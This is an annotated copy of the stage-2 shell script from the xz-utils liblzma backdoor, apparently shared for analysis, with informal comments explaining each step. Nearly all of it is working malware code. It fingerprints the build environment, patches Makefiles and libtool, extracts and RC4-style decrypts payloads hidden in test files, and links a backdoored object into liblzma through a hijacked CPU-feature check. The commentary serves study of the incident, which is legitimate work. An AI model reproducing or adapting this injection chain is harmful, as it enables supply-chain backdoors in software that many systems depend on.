# Define a bunch of stuff (this is just to obfuscate checks/patches)
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"

# Check (again) that we're on linux
# We never know, okay? maybe we swapped from linux to macos magically!
[ ! $(uname)="Linux" ] && exit 0

# This is never defined, I can only assume it's some debug thing?
eval $zrKcVq

# The backdoor is actually called multiple times, as this is the only ones that actually "do something" (as, editing/creating files),
# There's conditions so it only do things when the proper conditions are met:
#   * Either it's ran in the top-level dir (eg. xz-5.6.1/), then it do Makefile patching if we're creating a deb or rpm package
#   * Or it's ran under src/liblzma, then it patches, re-compile crc64_fast.c, then link liblzma.so with the backdoor inside
# The takeaway here is: THIS IS NOT ONLY FOR DEBIAN AND RHEL! the deb/rpm conditional part is only the Makefile patching
# Also, there's two addons for the 2 calls, those aren't conditionnal at all, so it could be that this was a patch/runtime fix mechanism, not "2 differents addons", the first is the top-level patch, the second is the liblzma patch

# It's the top-level makefile that calls it (config.status exists), patches Makefiles for .deb and .rpm
if test -f config.status; then

	# Debug thing again
	eval $zrKcSS

	# Get and re-define these from config.status
	eval `grep ^LD=\'\/ config.status`
	eval `grep ^CC=\' config.status`
	eval `grep ^GCC=\' config.status`
	eval `grep ^srcdir=\' config.status`
	eval `grep ^build=\'x86_64 config.status`
	eval `grep ^enable_shared=\'yes\' config.status`
	eval `grep ^enable_static=\' config.status`
	eval `grep ^gl_path_map=\' config.status`

	## addon 1: '~!:_ W' to '|_!{ -'
	## This basically try to find a file that matches both patterns,
	## then checks if the file are the same for both pattern and exists,
	## then decode/decrypt and eval'd the script in file
	vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
	if test "x$vs" != "x" > /dev/null 2>&1;then
		f1=`echo $vs | cut -d: -f1`
		if test "x$f1" != "x" > /dev/null 2>&1;then
			start=`expr $(echo $vs | cut -d: -f2) + 7`
			ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
			if test "x$ve" != "x" > /dev/null 2>&1;then
				f2=`echo $ve | cut -d: -f1`
				if test "x$f2" != "x" > /dev/null 2>&1;then
					[ ! "x$f2" = "x$f1" ] && exit 0
					[ ! -f $f1 ] && exit 0
					end=`expr $(echo $ve | cut -d: -f2) - $start`
					eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
				fi
			fi
		fi
	fi

	# Debug thing
	eval $zrKccj

	# Check that ifunc exists 2 times
	if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
		exit 0
	fi

	if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
		exit 0
	fi

	# Check that enable_shared is defined to yes
	if test "x$enable_shared" != "xyes";then
		exit 0
	fi

	# Check that we're on x64 *and* on *linux-gnu
	if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
		exit 0
	fi

	# Check that is_arch_extension_supported eixsts in crc64_fast.c
	if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
		exit 0
	fi

	# Check that is_arch_extension_supported eixsts in crc32_fast.c
	if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
		exit 0
	fi

	# Check that is_arch_extension_supported eixsts in crc_x86_clmul.h
	if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
		exit 0
	fi

	# Check that __get_cpuid exists in crc_x86_clmul.h
	if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
		exit 0
	fi

	# Check that we're using GCC, because fuck clang i guess
	if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
		exit 0
	fi

	# Check again that we're *really* using GCC...
	if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
		exit 0
	fi

	# Check that we're using gnu ld
	LDv=$LD" -v"
	if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
		exit 0
	fi

	# Check that good-large_compressed.lzma (eg. stage 2 + .so file) exists
	if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
		exit 0
	fi

	# Check that bad-3-corrupt_lzma2.xz (eg. stage 1) exists
	if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
		exit 0
	fi

	# Check that we're on debian or rpm
	if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

		# Debug thing
		eval $zrKcst

		# Check that we have anything that needs to be patched in Makefile

		## Check that ACLOCAL_M4 is defined in Makefile
		j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
		if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check that am__uninstall_files_from_dir is defined in Makefile
		z="^am__uninstall_files_from_dir = {"
		if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check that am__install_max is defined in makefile
		w="^am__install_max ="
		if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check that am__uninstall_files_from_dir is still defined in Makefile
		## WTF is that?
		E=$z
		if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check that am__vpath_adj_setup is defined in Makefile
		Q="^am__vpath_adj_setup ="
		if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check for am__include in Makefile
		M="^am__include = include"
		if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check for all: in Makefile
		L="^all: all-recursive$"
		if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check for LTLBRARIES in Makefile
		m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
		if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		## Check for AM_V_CCLD in Makefile
		u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
		if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
			exit 0
		fi

		# Check for pic_flag in libtool script
		if ! grep -qs "$O" libtool > /dev/null 2>&1;then
			exit 0
		fi

		# Debug thing
		eval $zrKcTy

		# Start to patch the Makefile

		## Patch "liblzma_la_LDFLAGS += $h"
		b="am__test = $U"
		sed -i "/$j/i$b" src/liblzma/Makefile || true

		d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
		b="am__strip_prefix = $d"
		sed -i "/$w/i$b" src/liblzma/Makefile || true

		b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
		sed -i "/$E/i$b" src/liblzma/Makefile || true

		b="\$(top_srcdir)/tests/files/\$(am__test)"
		s="am__test_dir=$b"
		sed -i "/$Q/i$s" src/liblzma/Makefile || true

		h="-Wl,--sort-section=name,-X"

		if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
			h=$h",-z,now"
		fi

		j="liblzma_la_LDFLAGS += $h"

		sed -i "/$L/i$j" src/liblzma/Makefile || true

		sed -i "s/$O/$C/g" libtool || true

		k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
		sed -i "s/$u/$k/" src/liblzma/Makefile || true

		l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
			export top_srcdir='\$(top_srcdir)'; \\\\\n\
			export CC='\$(CC)'; \\\\\n\
			export DEFS='\$(DEFS)'; \\\\\n\
			export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
			export INCLUDES='\$(INCLUDES)'; \\\\\n\
			export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
			export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
			export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
			export CFLAGS='\$(CFLAGS)'; \\\\\n\
			export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
			export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
			export libdir='\$(libdir)'; \\\\\n\
			export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
			export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
			sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
		sed -i "/$m/i$l" src/liblzma/Makefile || true

		# Debug thing
		eval $zrKcHD
	fi

# If we're in src/liblzma (the liblzma .o files exists), actually patch liblzma to include the backdoor
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then

	# Addon 2: 'jV!.^%' to '%.R.1Z'
	vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
	if test "x$vs" != "x" > /dev/null 2>&1;then
		f1=`echo $vs | cut -d: -f1`
		if test "x$f1" != "x" > /dev/null 2>&1;then
			start=`expr $(echo $vs | cut -d: -f2) + 7`
			ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
			if test "x$ve" != "x" > /dev/null 2>&1;then
				f2=`echo $ve | cut -d: -f1`
				if test "x$f2" != "x" > /dev/null 2>&1;then
					[ ! "x$f2" = "x$f1" ] && exit 0
					[ ! -f $f1 ] && exit 0
					end=`expr $(echo $ve | cut -d: -f2) - $start`
					eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
				fi
			fi
		fi
	fi

	# Debug thing
	eval $zrKcKQ

	# Check (again) that is_arch_extension_supported eixsts in crc64_fast.c
	if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
		exit 0
	fi

	# Check (again) that is_arch_extension_supported eixsts in crc32_fast.c
	if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
		exit 0
	fi

	# Check (again) that is_arch_extension_supported eixsts in crc_x86_clmul.h
	if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
		exit 0
	fi

	# Check (again) that __get_cpuid exists in crc_x86_clmul.h
	if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
		exit 0
	fi

	# Check for PIC flags in libtool (script)
	if ! grep -qs "$C" ../../libtool; then
		exit 0
	fi

	# Check that liblzma linker flags contains -z,now or -z -Wl,now
	if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
		exit 0
	fi

	# Check that liblzma link flags contains lazy
	if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
		exit 0
	fi

	# Set start and end offets for evil .so file in payload archive
	N=0
	W=0

	# If this is zero, it's 0 to 88664, else it's 88664 to 0
	Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`

	# Debug thing
	eval $zrKcjv

	# No idea why this is needed yet
	if test -z "$Y"; then
		N=0
		W=88664
	else
		N=88664
		W=0
	fi

	# Carve-out from archive, decrypt (using a RC4 derivative) and write the backdoor binary to crc64-fast.so file
	xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | \
		LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | \
		xz -dc --single-stream | ( (head -c +$N > /dev/null 2>&1) && head -c +$W ) \
		> liblzma_la-crc64-fast.o || true

	# If file doesn't exist, there's an issue... so we stop right here
	if ! test -f liblzma_la-crc64-fast.o; then
		exit 0
	fi

	# Copy file from crc64_fast.o to crc64-fast.o (backup)
	cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true

	# This is the string to patch crc64_fast.c
	V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'

	# Debug thing (?)
	eval $yosA

	if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
	# Some obfuscation for $V/the crc64_fast.c patch
		sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
		sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
		## $P is "-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
		## This also recompiles crc64_fast.c using the patched file
		$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then

		# If compilation was successful, do the same for crc32_fast.c
		# Copy crc32_fast.o to crc32-fast.o (backup)
		cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true

		# Debug thing (?)
		eval $BPep

		if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
			sed "/include \"crc32_arm64.h\"/a \\$V" | \
			sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
			$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then

			# Debug thing
			eval $RgYB

			# If we link correctly
			if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then

				# If liblzma doesn't exist yet, we revert the .o using the backups
				if test ! -f .libs/liblzma.so; then
					mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
					mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
				fi

				# We delete all liblzma binaries
				rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true

			else # There was an error linking
				# we revert the .o using the backups
				mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
				mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
			fi

			# Everything went smoothly, delete the backups
			rm -f .libs/liblzma_la-crc32-fast.o || true
			rm -f .libs/liblzma_la-crc64-fast.o || true
		else # There was an error compilling crc32_fast.c
			 # we revert the .o using the backups
			mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
			mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
		fi
	else # There was an error compilling crc64_fast.c
		mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
	fi

	# Delete the evil crc64-fast.o (it was included in the final lib)
	rm -f liblzma_la-crc64-fast.o || true
fi

# Final debug thing
eval $DHLd
